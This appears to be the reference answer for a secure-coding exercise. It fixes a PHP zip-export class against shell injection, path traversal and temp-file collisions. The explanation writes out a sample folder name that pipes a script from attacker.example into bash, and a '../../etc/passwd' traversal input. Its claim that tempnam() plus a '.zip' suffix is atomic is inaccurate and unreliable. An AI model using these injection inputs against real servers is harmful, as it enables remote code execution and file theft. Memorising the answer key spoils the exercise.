## Reference solution

```php
// ------------------------------------------------------------------------
// ANSWER — Shell Injection via Archive Filename
// ------------------------------------------------------------------------

<?php
// export/ZipExporter.php

class ZipExporter
{
    private string $storageRoot;

    public function __construct(string $storageRoot)
    {
        $this->storageRoot = rtrim($storageRoot, '/');
    }

    public function export(string $folderName, string $userId): string
    {
        // CHANGE 2: Resolve the real path before use so that '../' traversal sequences are collapsed and we can verify the result stays inside the user's storage root.
        $sourceDir = realpath($this->storageRoot . '/' . $userId . '/' . $folderName);
        $userRoot  = realpath($this->storageRoot . '/' . $userId);

        if ($sourceDir === false || $userRoot === false || strncmp($sourceDir, $userRoot . '/', strlen($userRoot) + 1) !== 0) {
            throw new RuntimeException('Folder not found');
        }

        if (!is_dir($sourceDir)) {
            throw new RuntimeException('Folder not found');
        }

        // CHANGE 3: Use a random temporary name for the output zip instead of the raw folderName so that filenames cannot collide across users and the name is never attacker-controlled.
        $outputZip = tempnam(sys_get_temp_dir(), 'zipexp_') . '.zip';

        // CHANGE 1: Replace string interpolation with escapeshellarg() on every argument passed to exec() so that shell metacharacters in folderName cannot inject additional commands or arguments.
        $cmd = 'zip -r ' . escapeshellarg($outputZip) . ' ' . escapeshellarg($sourceDir);
        exec($cmd, $output, $returnCode);

        if ($returnCode !== 0) {
            throw new RuntimeException('zip failed: ' . implode('\n', $output));
        }

        return $outputZip;
    }
}
```

## Explanation

### Issue 1: Shell Injection via Unsanitized Filename

**Problem:** A user who names their folder `pwned; curl http://attacker.example/shell.sh | bash #` causes the server to execute that curl command during export. The web server error log shows unexpected outbound HTTP connections, and any command the attacker injects runs with the privileges of the PHP process.

**Fix:** Replace the double-quoted string interpolation `"zip -r \"$outputZip\" \"$sourceDir\"` with `escapeshellarg()` applied individually to `$outputZip` and `$sourceDir`, producing `'zip -r ' . escapeshellarg($outputZip) . ' ' . escapeshellarg($sourceDir)`.

**Explanation:** When a value is placed inside a double-quoted shell string, a shell metacharacter like `;`, `|`, or `$()` ends the current argument and starts a new shell token. Wrapping the argument in double quotes only stops word-splitting on spaces; it does not neutralize `;` or `|`. `escapeshellarg()` wraps the entire value in single quotes and escapes any single quote inside the value, so the shell treats the whole string as one literal argument with no metacharacter interpretation. The original ops fix of adding extra double quotes did make accidental triggering (e.g., a space in the name) less likely, but it left semicolons and other metacharacters fully effective.

---

### Issue 2: Path Traversal via folderName

**Problem:** A folderName of `../../etc/passwd` causes `$sourceDir` to resolve to `/etc`, which `is_dir()` confirms exists, and the zip command then archives files outside the user's own directory. The user receives a zip containing server configuration files or other users' documents.

**Fix:** Call `realpath()` on the constructed path and on the user's root directory, then assert that `$sourceDir` starts with `$userRoot . '/'` using `strncmp()`. If `realpath()` returns `false` (path does not exist) or the prefix check fails, throw `RuntimeException('Folder not found')`.

**Explanation:** `realpath()` resolves all `..` components, symlinks, and redundant slashes, returning the canonical absolute path. Comparing the result with a prefix derived from the user's own storage root guarantees that no matter what the folderName contains, the resolved path must be a descendant of that root. Without this check, the only protection is the double quotes in the shell command, which do not affect filesystem traversal at all — the OS resolves `..` before the shell even sees the path. A related pitfall: the prefix check must append a `/` to `$userRoot` before comparing, otherwise a user root of `/data/users/10` would incorrectly accept `/data/users/100/secrets`.

---

### Issue 3: Predictable Temp Filename Enables Cross-User Collision

**Problem:** Two users who both own a folder named `reports` generate zip files at the identical path `<tmpdir>/reports.zip`. The second export silently overwrites the first, and either user who knows the path can read the other's data before it is served and deleted.

**Fix:** Replace `sys_get_temp_dir() . '/' . $folderName . '.zip'` with `tempnam(sys_get_temp_dir(), 'zipexp_') . '.zip'`, which atomically creates a uniquely named file and returns its path.

**Explanation:** `tempnam()` uses the OS to allocate a filename that does not currently exist and creates the file with mode 0600 in one atomic operation, preventing both name collisions and a TOCTOU race where an attacker creates the file between the name-generation and write steps. The raw `folderName` is attacker-controlled, so using it as a temp filename also means an attacker could deliberately choose a name that collides with a sensitive existing file (e.g., `../var/www/html/index.php.zip` after traversal, or a name matching a file another request is currently writing).
